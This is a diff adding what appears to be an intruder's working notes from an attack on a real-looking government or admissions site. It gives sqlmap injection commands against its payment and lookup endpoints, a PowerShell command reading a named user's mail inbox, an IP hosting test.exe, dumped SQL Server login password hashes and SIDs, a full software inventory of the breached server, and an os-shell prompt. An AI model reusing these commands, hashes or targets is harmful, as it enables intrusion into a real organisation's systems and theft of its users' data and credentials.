@@ -1,0 +1,201 @@
+sqlmap  https://jksbotelive.com/Migration/payment-handler.php  --data "AckNumber=10256633&FeeType=MIGRATION&FeeAmount=&HashedValue=2243543&Name=++&RegNumber=&PhoneNumber=778+&EmailID=" -p AckNumber --dbs
+
+1.sqlmap.py "https://lateral.jksbotelive.com/getInstituteID.php?SectionID=55&Type=55"  --priv-esc
+
+2.https://lateral.jksbotelive.com/getProgrammeID.php?InstituteID=55&Type=55
+
+powershell "dir 'c:/Program Files (x86)/Mail Enable/POSTOFFICES/jksbotelive.com/MaiLROOT/abid/Inbox'"
+
+
+http://202.66.174.219/
+
+13.51.205.254/test.exe
+============================================================================
+/* sp_help_revlogin script 
+** Generated Dec 30 2021 10:19PM on WIN-89SDC791KL2 */
+ 
+-- Login: ##MS_PolicyTsqlExecutionLogin##
+CREATE LOGIN [##MS_PolicyTsqlExecutionLogin##] WITH PASSWORD = 0x0
+1006C8AC3584B969CB2FB24CBE70F9921E55365B618486E5D1D HASHED, SID = 
+0x014EA8886B841C4CA1F7ED32489BBF62, DEFAULT_DATABASE = [master], C
+HECK_POLICY = ON, CHECK_EXPIRATION = OFF; ALTER LOGIN [##
+MS_PolicyTsqlExecutionLogin##] DISABLE
+-- Login: NT AUTHORITY\SYSTEM
+CREATE LOGIN [NT AUTHORITY\SYSTEM] FROM WINDOWS WITH DEFAULT_DATAB
+ASE = [master]
+-- Login: NT SERVICE\MSSQLSERVER
+CREATE LOGIN [NT SERVICE\MSSQLSERVER] FROM WINDOWS WITH DEFAULT_DA
+TABASE = [master]
+-- Login: WIN-89SDC791KL2\Administrator
+CREATE LOGIN [WIN-89SDC791KL2\Administrator] FROM WINDOWS WITH DEF
+AULT_DATABASE = [master]
+-- Login: BUILTIN\Users
+CREATE LOGIN [BUILTIN\Users] FROM WINDOWS WITH DEFAULT_DATABASE = 
+[master]
+-- Login: NT AUTHORITY\NETWORK SERVICE
+CREATE LOGIN [NT AUTHORITY\NETWORK SERVICE] FROM WINDOWS WITH DEFA
+ULT_DATABASE = [master]
+-- Login: ##MS_PolicyEventProcessingLogin##
+CREATE LOGIN [##MS_PolicyEventProcessingLogin##] WITH PASSWORD = 0
+x0100B0C0F5ABD81670CDDB6EF768094F485169F25E6EFB6D1548 HASHED, SID 
+= 0x193CFE63B9093D4D9278FA06279753E8, DEFAULT_DATABASE = [master],
+ CHECK_POLICY = ON, CHECK_EXPIRATION = OFF; ALTER LOGIN [
+##MS_PolicyEventProcessingLogin##] DISABLE
+-- Login: DTE
+CREATE LOGIN [DTE] WITH PASSWORD = 0x0100884495423F43613381FFAD9AD
+DF237EBE3EC084A8B29BC95 HASHED, SID = 0x282341933F1B1844AE2272B1B0
+540C16, DEFAULT_DATABASE = [DTE_ADMISSION_2021], CHECK_POLICY = OF
+F, CHECK_EXPIRATION = OFF
+---
+
+
+
+
+==========================================
+Name                                                           Version
+----                                                           -------
+Integration Services                                           15.0.2000.118
+MariaDB 10.5 (x64)                                             10.5.20.0
+Microsoft .NET Core Host - 2.1.20 (x64)                        16.80.29019
+PHP 7.1 script engine                                          7.1.3360
+Microsoft Application Request Routing 3.0                      3.0.1952
+Plesk Desktop                                                  18.53.36830
+Microsoft Web Deploy 4.0                                       10.0.1994
+Microsoft SQL Server 2019 T-SQL Language Service               15.0.2000.5
+Microsoft OLE DB Driver for SQL Server                         18.3.0.0
+Plesk ModSecurity rules                                        18.0.48
+Microsoft Analysis Services OLE DB Provider                    15.0.2000.20
+Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219    10.0.40219
+Microsoft .NET Host FX Resolver - 5.0.17 (x64)                 40.68.31213
+Microsoft .NET Core Runtime - 3.1.32 (x86)                     24.192.31915
+Microsoft Help Viewer 2.3                                      2.3.28107
+Plesk module                                                   18.0.53
+Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219    10.0.40219
+PHP 8.0 script engine                                          8.0.2910
+Microsoft ASP.NET Core Module V2                               17.0.23172.0
+Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005     12.0.21005
+SQL Server 2019 Client Tools Extensions                        15.0.2000.5
+Microsoft ODBC Driver 17 for SQL Server                        17.10.2.1
+Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005  12.0.21005
+Microsoft .NET Host FX Resolver - 7.0.9 (x86)                  56.39.63170
+iisnode for iis 7.x (x64) full                                 0.2.21.0
+Microsoft .NET Runtime - 7.0.9 (x64)                           56.39.63170
+Microsoft .NET Core Runtime - 2.1.20 (x64)                     16.80.29019
+Microsoft .NET Core Host FX Resolver - 3.1.32 (x64)            24.192.31915
+SQL Server 2019 XEvent                                         15.0.2000.5
+Plesk Core module                                              18.50.32841
+Microsoft .NET Core Runtime - 3.1.32 (x64)                     24.192.31915
+Microsoft System CLR Types for SQL Server 2019 CTP3.0          15.0.1600.8
+SQL Server 2019 Connection Info                                15.0.2000.5
+SQL Server 2019 DMF                                            15.0.2000.5
+SQL Server 2019 Client Tools                                   15.0.2000.5
+Microsoft ASP.NET Core 2.1.20 Shared Framework (x86)           2.1.20.0
+Plesk Python (2.7.18003)                                       2.7.18003
+Microsoft .NET Core Host - 3.1.32 (x64)                        24.192.31915
+Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.40664     12.0.40664
+Microsoft Visual C++ 2019 X86 Additional Runtime - 14.29.30139 14.29.30139
+AWStats                                                        7.7.320
+Microsoft SQL Server 2019 RsFx Driver                          15.0.2000.5
+Microsoft VSS Writer for SQL Server 2019                       15.0.2000.5
+SPAW Editor                                                    18.0.52
+SQL Server 2019 Client Tools Extensions                        15.0.2000.5
+Microsoft .NET Host - 6.0.20 (x64)                             48.83.63169
+Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.29.30139    14.29.30139
+Microsoft Web Platform Installer 5.0                           5.0.50430.0
+Microsoft ASP.NET Core 2.1.20 Shared Framework (x64)           2.1.20.0
+SQL Server 2019 Connection Info                                15.0.2000.5
+Microsoft .NET Core Runtime - 2.1.20 (x86)                     16.80.29019
+SQL Server 2019 Client Tools                                   15.0.2000.5
+Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161 9.0.30729....
+Microsoft ASP.NET Core 7.0.9 Shared Framework (x64)            7.0.9.23321
+Microsoft .NET Core Host - 2.1.20 (x86)                        16.80.29019
+Plesk SQL Server                                               10.11.340
+Microsoft ASP.NET Core 3.1.6 Shared Framework (x86)            3.1.6.0
+Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161 9.0.30729....
+Microsoft .NET Core Host FX Resolver - 2.1.20 (x86)            16.80.29019
+Microsoft .NET Core Host FX Resolver - 2.1.20 (x64)            16.80.29019
+SQL Server 2019 Database Engine Shared                         15.0.2000.5
+Browser for SQL Server 2019                                    15.0.2000.5
+Microsoft SQL Server 2012 Native Client                        11.4.7462.6
+SQL Server 2019 DMF                                            15.0.2000.5
+SQL Server 2019 Shared Management Objects Extensions           15.0.2000.5
+Microsoft Analysis Services OLE DB Provider                    15.0.2000.20
+SSMS Post Install Tasks                                        15.0.18338.0
+Microsoft SQL Server Reporting Services                        15.0.7243....
+IIS URL Rewrite Module 2                                       7.2.1993
+SQL Server 2019 SQL Diagnostics                                15.0.2000.5
+Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.30.30704    14.30.30704
+Microsoft .NET Runtime - 5.0.17 (x64)                          40.68.31213
+Microsoft Visual C++ 2022 X64 Additional Runtime - 14.30.30704 14.30.30704
+SQL Server Management Studio for Analysis Services             15.0.18338.0
+Zabbix Agent (64-bit)                                          5.4.11.2400
+PHP 7.4 script engine                                          7.4.3340
+SQL Server 2019 Shared Management Objects                      15.0.2000.5
+Microsoft .NET Runtime - 6.0.20 (x86)                          48.83.63169
+Microsoft .NET Host - 5.0.17 (x86)                             40.68.31213
+Plesk Perl (18.0.34)                                           18.0.34
+SQL Server 2019 Common Files                                   15.0.2000.5
+Microsoft ASP.NET Core 3.1.6 Shared Framework (x64)            3.1.6.0
+Microsoft .NET Runtime - 5.0.17 (x86)                          40.68.31213
+Microsoft .NET Core Host - 3.1.32 (x86)                        24.192.31915
+MariaDB 10.3 (x64)                                             10.3.32.0
+Microsoft .NET Runtime - 7.0.9 (x86)                           56.39.63170
+Microsoft ASP.NET Core Module                                  12.1.20171.0
+Microsoft ASP.NET Core 7.0.9 Shared Framework (x86)            7.0.9.23321
+Cyber Protect                                                  15.0.35887
+Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.40664  12.0.40664
+SQL Server Management Studio                                   15.0.18338.0
+SQL Server 2019 Shared Management Objects Extensions           15.0.2000.5
+Webalizer                                                      2.01.11
+Microsoft Visual C++ 2012 x86 Minimum Runtime - 11.0.60610     11.0.60610
+SQL Server 2019 Batch Parser                                   15.0.2000.5
+Visual Studio 2017 Isolated Shell for SSMS                     15.0.28307...
+Microsoft .NET Host FX Resolver - 5.0.17 (x86)                 40.68.31213
+Microsoft .NET Host - 7.0.9 (x64)                              56.39.63170
+SQL Server 2019 Shared Management Objects                      15.0.2000.5
+Microsoft .NET Host - 6.0.20 (x86)                             48.83.63169
+ModSecurity IIS                                                2.9.6
+Microsoft ODBC Driver 11 for SQL Server                        12.2.5543.11
+Microsoft ODBC Driver 13 for SQL Server                        13.1.4414.46
+SQL Server 2019 Full text search                               15.0.2000.5
+Plesk Engine                                                   18.53.36830
+SQL Server 2019 Database Engine Services                       15.0.2000.5
+Microsoft ASP.NET Core 6.0.20 Shared Framework (x64)           6.0.20.23321
+Plesk repair IIS module                                        18.0.34
+SQL Server 2019 Database Engine Shared                         15.0.2000.5
+Microsoft IIS Compression                                      1.0.06502
+Microsoft .NET Runtime - 6.0.20 (x64)                          48.83.63169
+Microsoft .NET Host - 7.0.9 (x86)                              56.39.63170
+MySQL Connector/ODBC 5.3                                       5.3.14
+Microsoft Visual Studio Tools for Applications 2017 x64 Hos... 15.0.27520
+Microsoft .NET Host FX Resolver - 7.0.9 (x64)                  56.39.63170
+SQL Server 2019 Common Files                                   15.0.2000.5
+Microsoft SQL Server 2019 Setup (English)                      15.0.4013.40
+Microsoft ASP.NET Core 3.1.32 Shared Framework (x86)           3.1.32.22566
+Microsoft ASP.NET Core 5.0.17 Shared Framework (x86)           5.0.17.22215
+Microsoft .NET Host - 5.0.17 (x64)                             40.68.31213
+SQL Server 2019 XEvent                                         15.0.2000.5
+MariaDB 10.5 Server Configurator                               18.0.53
+Plesk URL protection IIS module                                18.0.39
+Microsoft Visual Studio Tools for Applications 2017 x86 Hos... 15.0.27520
+SQL Server 2019 Database Engine Services                       15.0.2000.5
+Microsoft ASP.NET Core 3.1.32 Shared Framework (x64)           3.1.32.22566
+Microsoft .NET Core Host FX Resolver - 3.1.32 (x86)            24.192.31915
+PHP 5.6 script engine                                          5.6.4040
+SQL Server Management Studio for Reporting Services            15.0.18338.0
+SQL Server Management Studio                                   15.0.18338.0
+Plesk Service Node Utilities                                   18.53.36830
+Microsoft ASP.NET Core 5.0.17 Shared Framework (x64)           5.0.17.22215
+MySQL Connector/ODBC 3.51                                      3.51.30
+Microsoft .NET Host FX Resolver - 6.0.20 (x86)                 48.83.63169
+Node.js                                                        12.22.11
+Plesk System Health Monitor                                    18.53.36374
+Microsoft .NET Host FX Resolver - 6.0.20 (x64)                 48.83.63169
+Microsoft ASP.NET Core 6.0.20 Shared Framework (x86)           6.0.20.23321
+NULL
+NULL
+NULL
+---
+os-shell>
+
+
